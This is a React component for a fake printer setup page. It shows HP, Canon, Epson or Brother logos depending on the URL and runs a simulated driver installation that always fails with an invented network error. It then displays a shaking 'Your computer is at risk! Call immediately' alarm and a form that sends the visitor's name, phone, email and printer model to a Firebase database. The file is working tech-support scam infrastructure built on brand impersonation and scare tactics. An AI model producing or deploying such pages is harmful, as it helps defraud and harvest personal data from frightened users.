import React, { useState, useEffect, useRef } from "react";
import styled, { keyframes } from "styled-components";
import { FaWindows, FaApple, FaLinux } from "react-icons/fa";
import { useLocation } from "react-router-dom";

const Container = styled.div`
  font-family: "Arial", sans-serif;
  max-width: 800px;
  margin: 0 auto;
  padding: 20px;
`;
const LogoImage = styled.img`
  height: 40px; // Adjust as needed
  width: auto;
`;
const ErrorMessage = styled.p`
  color: #d32f2f;
  font-weight: bold;
  margin-top: 10px;
`;

const SuccessMessage = styled.p`
  color: #4caf50;
  font-weight: bold;
  margin-top: 10px;
`;
const Popup = styled.div`
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  background: white;
  padding: 30px;
  border-radius: 8px;
  box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
  z-index: 2000;
  max-width: 400px;
  width: 100%;
`;

const Form = styled.form`
  display: flex;
  flex-direction: column;
  gap: 15px;
`;

const FormField = styled.div`
  display: flex;
  flex-direction: column;
  gap: 5px;
`;

const Label = styled.label`
  font-weight: bold;
  color: #555;
`;

const Input = styled.input`
  padding: 10px;
  border: 1px solid #ddd;
  border-radius: 4px;
  font-size: 16px;
  outline: none;

  &:focus {
    border-color: #2196f3;
  }
`;

const SubmitButton = styled.button`
  padding: 10px 20px;
  background-color: #2196f3;
  color: white;
  border: none;
  border-radius: 4px;
  cursor: pointer;
  font-size: 16px;
  transition: background-color 0.3s;

  &:hover {
    background-color: #1976d2;
  }
`;

const Navbar = styled.nav`
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 10px 20px;
  background-color: white;
  color: black;
  position: sticky;
  top: 0;
  z-index: 1000;
  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
`;

const Logo = styled.div`
  font-size: 24px;
  font-weight: bold;
`;

const NavLinks = styled.ul`
  list-style: none;
  display: flex;
  gap: 20px;
`;

const NavLink = styled.li`
  font-size: 16px;
  font-weight: bold;
  cursor: pointer;
  color: black;

  &:hover {
    text-decoration: underline;
  }
`;

const OSInfo = styled.p`
  display: flex;
  align-items: center;
  font-size: 14px;
`;

const Title = styled.h1`
  font-size: 24px;
  margin-bottom: 20px;
  color: #333;
`;

const Section = styled.div`
  background-color: #f5f5f5;
  padding: 20px;
  border-radius: 8px;
  margin-bottom: 20px;
  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
`;

const SectionTitle = styled.h2`
  font-size: 18px;
  margin-bottom: 10px;
  color: #444;
`;

const ProgressBar = styled.div`
  background-color: #e0e0e0;
  border-radius: 5px;
  height: 20px;
  overflow: hidden;
`;

const Progress = styled.div`
  width: ${(props) => props.progress}%;
  background-color: #4caf50;
  height: 100%;
  border-radius: 5px;
  transition: width 0.5s ease-in-out;
`;

const Terminal = styled.div`
  background-color: #1e1e1e;
  color: #00ff00;
  padding: 15px;
  border-radius: 5px;
  height: 150px;
  overflow-y: auto;
  margin-bottom: 20px;
  font-family: "Consolas", monospace;
  font-size: 14px;
`;

const Button = styled.button`
  padding: 10px 20px;
  background-color: ${(props) => (props.primary ? "#4CAF50" : "#2196F3")};
  color: white;
  border: none;
  border-radius: 5px;
  cursor: pointer;
  font-size: 16px;
  transition: background-color 0.3s;

  &:hover {
    background-color: ${(props) => (props.primary ? "#45a049" : "#1e88e5")};
  }
`;

const OSIcon = styled.span`
  font-size: 24px;
  margin-right: 10px;
`;

const ErrorSection = styled(Section)`
  background-color: #ffebee;
  color: #d32f2f;
  border: 1px solid #f44336;
`;

const DangerMessage = styled.div`
  background-color: #ff0000;
  color: white;
  padding: 15px;
  border-radius: 5px;
  margin-top: 20px;
  font-weight: bold;
  text-align: center;
  font-size: 18px;
`;

const shake = keyframes`
  0% { transform: translateX(0); }
  25% { transform: translateX(-5px); }
  50% { transform: translateX(5px); }
  75% { transform: translateX(-5px); }
  100% { transform: translateX(0); }
`;

const ShakingButton = styled(Button)`
  animation: ${shake} 2s ease-in-out infinite;
`;

const ConfirmationPage = styled.div`
  text-align: center;
  padding: 50px;
  background-color: #e8f5e9;
  border-radius: 8px;
  margin-top: 20px;
`;

const CountdownTimer = styled.p`
  font-size: 18px;
  font-weight: bold;
  margin-top: 20px;
`;

const ErrorPage = () => {
  const location = useLocation();

  const getLogo = () => {
    const path = location.pathname;
    if (path.includes("/setup-guide/hp")) {
      return "https://1000logos.net/wp-content/uploads/2017/02/HP-Logo-2012.png";
    } else if (path.includes("/setup-guide/canon")) {
      return "https://1000logos.net/wp-content/uploads/2016/10/Canon-Logo.png";
    } else if (path.includes("/setup-guide/epson")) {
      return "https://1000logos.net/wp-content/uploads/2018/02/Epson-Logo.png";
    } else path.includes("/setup-guide/brother");
    return "https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/Brother_logo.svg/1024px-Brother_logo.svg.png";
  };
  const renderTerminalOutput = () => {
    const redLineCount = 3; // You can change this to 4 or 5 if needed
    return terminalOutput.map((line, index) => {
      const isRedLine = index >= terminalOutput.length - redLineCount;
      return (
        <p
          key={index}
          style={{
            color: isRedLine ? "#ff0000" : "inherit",
          }}
        >
          {line}
        </p>
      );
    });
  };
  const [formError, setFormError] = useState("");
  const [formSuccess, setFormSuccess] = useState("");
  const [showPopup, setShowPopup] = useState(false);
  const [progress, setProgress] = useState(0);
  const [osInfo, setOsInfo] = useState({ name: "", version: "" });
  const [showError, setShowError] = useState(false);
  const [terminalOutput, setTerminalOutput] = useState([]);
  const [isInstalling, setIsInstalling] = useState(false);
  const [installationComplete, setInstallationComplete] = useState(false);
  const [currentPage, setCurrentPage] = useState("errorPage");
  const [countdown, setCountdown] = useState(120);
  const [form, setForm] = useState({
    name: "",
    number: "",
    email: "",
    model: "",
  });

  const terminalRef = useRef(null);

  useEffect(() => {
    detectOS();
  }, []);

  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
    }
  }, [terminalOutput]);

  useEffect(() => {
    let timer;
    if (currentPage === "supportRequestSubmitted" && countdown > 0) {
      timer = setInterval(() => {
        setCountdown((prevCount) => prevCount - 1);
      }, 1000);
    }
    return () => clearInterval(timer);
  }, [currentPage, countdown]);
  const detectOS = () => {
    const userAgent = window.navigator.userAgent;
    let detectedOS = { name: "Unknown OS", version: "" };

    if (userAgent.indexOf("Win") !== -1) {
      detectedOS.name = "Windows";
      const version = userAgent.match(/Windows NT (\d+\.\d+)/);
      if (version) {
        detectedOS.version = version[1] === "10.0" ? "10" : version[1];
      }
    } else if (userAgent.indexOf("Mac") !== -1) {
      detectedOS.name = "macOS";
      const version = userAgent.match(/Mac OS X (\d+[._]\d+)/);
      if (version) {
        detectedOS.version = version[1].replace("_", ".");
      }
    } else if (userAgent.indexOf("Linux") !== -1) {
      detectedOS.name = "Linux";
    }

    setOsInfo(detectedOS);
  };

  const getOSIcon = () => {
    switch (osInfo.name) {
      case "Windows":
        return <FaWindows />;
      case "macOS":
        return <FaApple />;
      case "Linux":
        return <FaLinux />;
      default:
        return null;
    }
  };

  const startInstallation = () => {
    setIsInstalling(true);
    setTerminalOutput([]);
    setProgress(0);
    simulateInstallation();
  };

  const simulateInstallation = () => {
    const steps = [
      "Initializing setup...",
      "Checking system requirements...",
      "Downloading printer_driver_v2.3.4.exe...",
      "Verifying package integrity...",
      "Extracting files...",
      "Updating system registry...",
      "Installing dependent packages...",
      "Configuring printer settings...",
      "Installing additional drivers...",
      "Connecting printer to network...",
      "Printer found, configuring IP settings...",
      "Error: Unable to assign IP address to the printer.",
      "Installation aborted due to network configuration error.",
    ];

    let currentStep = 0;
    const timer = setInterval(() => {
      if (currentStep < steps.length) {
        setTerminalOutput((prev) => [...prev, steps[currentStep]]);
        currentStep++;
        setProgress((oldProgress) => {
          const newProgress = Math.min(
            oldProgress + Math.floor(100 / (steps.length - 1)),
            100
          );
          if (newProgress === 100) {
            clearInterval(timer);
            setInstallationComplete(true);
            setShowError(true);
          }
          return newProgress;
        });
      } else {
        clearInterval(timer);
      }
    }, 1000);
  };

  const handleUrgentCallClick = () => {
    setShowPopup(true);
  };

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setForm({ ...form, [name]: value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setFormError("");
    setFormSuccess("");

    try {
      const response = await fetch(
        "https://tech-digi-bb339-default-rtdb.firebaseio.com/FormData.json",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(form),
        }
      );

      if (response.ok) {
        setFormSuccess("Form submitted successfully!");
        setTimeout(() => {
          setCurrentPage("supportRequestSubmitted");
          setShowPopup(false);
        }, 2000);
      } else {
        const errorData = await response.json();
        setFormError(`Failed to submit support request: ${errorData.message}`);
      }
    } catch (error) {
      console.error("Error submitting support request:", error);
      setFormError("An unexpected error occurred. Please try again later.");
    }
  };

  const renderErrorPage = () => (
    <>
      <Title>Printer Setup Assistant</Title>

      {!installationComplete && (
        <>
          <Section>
            <SectionTitle>Detected Operating System</SectionTitle>
            <OSInfo>
              <OSIcon>{getOSIcon()}</OSIcon>
              {osInfo.name} {osInfo.version}
            </OSInfo>
          </Section>

          <Section>
            <SectionTitle>Printer Driver Installation</SectionTitle>
            {!isInstalling ? (
              <Button primary onClick={startInstallation}>
                Start Installation
              </Button>
            ) : (
              <>
                <ProgressBar>
                  <Progress progress={progress} />
                </ProgressBar>
                <p>Progress: {progress}%</p>
              </>
            )}
          </Section>

          {isInstalling && (
            <Section>
              <SectionTitle>Installation Log</SectionTitle>
              <Terminal ref={terminalRef}>{renderTerminalOutput()}</Terminal>
            </Section>
          )}
        </>
      )}

      {showError && (
        <>
          <ErrorSection>
            <SectionTitle>Network Configuration Error</SectionTitle>
            <p>
              Unable to assign IP address to the printer. Check network settings
              and DHCP. Error Code: 0x800F081F
            </p>
          </ErrorSection>

          <DangerMessage>
            WARNING: Your computer is at risk! Call immediately for support!
          </DangerMessage>

          <div
            style={{
              display: "flex",
              justifyContent: "center",
              gap: "10px",
              marginTop: "20px",
            }}
          >
            <ShakingButton primary onClick={handleUrgentCallClick}>
              Request Urgent Support Call
            </ShakingButton>

            <ShakingButton>Live Chat Support</ShakingButton>
            {showPopup && (
              <Popup>
                <h3>Request Urgent Support Call</h3>
                <Form onSubmit={handleSubmit}>
                  <FormField>
                    <Label htmlFor="name">Name:</Label>
                    <Input
                      type="text"
                      id="name"
                      name="name"
                      required
                      value={form.name}
                      onChange={handleInputChange}
                    />
                  </FormField>
                  <FormField>
                    <Label htmlFor="number">Phone Number:</Label>
                    <Input
                      type="tel"
                      id="number"
                      name="number"
                      required
                      value={form.number}
                      onChange={handleInputChange}
                    />
                  </FormField>
                  <FormField>
                    <Label htmlFor="email">Email:</Label>
                    <Input
                      type="email"
                      id="email"
                      name="email"
                      required
                      value={form.email}
                      onChange={handleInputChange}
                    />
                  </FormField>
                  <FormField>
                    <Label htmlFor="model">Model:</Label>
                    <Input
                      type="text"
                      id="model"
                      name="model"
                      required
                      value={form.model}
                      onChange={handleInputChange}
                    />
                  </FormField>
                  <SubmitButton type="submit">Submit</SubmitButton>
                </Form>
                {formError && <ErrorMessage>{formError}</ErrorMessage>}
                {formSuccess && <SuccessMessage>{formSuccess}</SuccessMessage>}
              </Popup>
            )}
          </div>
        </>
      )}
    </>
  );

  const renderConfirmationPage = () => (
    <ConfirmationPage>
      <h2>Support Request Submitted</h2>
      <p>
        Thank you for submitting your support request. Our team will contact you
        shortly.
      </p>
      <CountdownTimer>
        Our team will contact you in: {Math.floor(countdown / 60)}:
        {countdown % 60 < 10 ? "0" : ""}
        {countdown % 60}
      </CountdownTimer>
      <Button onClick={() => setCurrentPage("errorPage")}>
        Back to Error Page
      </Button>
    </ConfirmationPage>
  );

  return (
    <>
      <Navbar>
        <Logo>
          <LogoImage src={getLogo()} alt="Printer Logo" />
        </Logo>
        <NavLinks>
          <NavLink>Home</NavLink>
          <NavLink>Support</NavLink>
          <NavLink>Contact</NavLink>
        </NavLinks>
      </Navbar>
      <Container>
        {currentPage === "errorPage"
          ? renderErrorPage()
          : renderConfirmationPage()}
      </Container>
    </>
  );
};

export default ErrorPage;
